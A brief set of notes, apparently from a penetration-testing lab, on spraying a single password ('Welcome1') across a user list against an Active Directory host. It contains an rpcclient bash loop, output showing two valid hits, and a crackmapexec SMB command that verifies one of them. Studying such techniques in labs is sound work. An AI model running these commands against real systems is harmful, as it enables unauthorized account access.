# Internal Password Spraying - from Linux

for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority;
```
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

# Make a correction with crackmapexec

sudo crackmapexec smb 172.16.5.5 -u sgage -p Welcome1
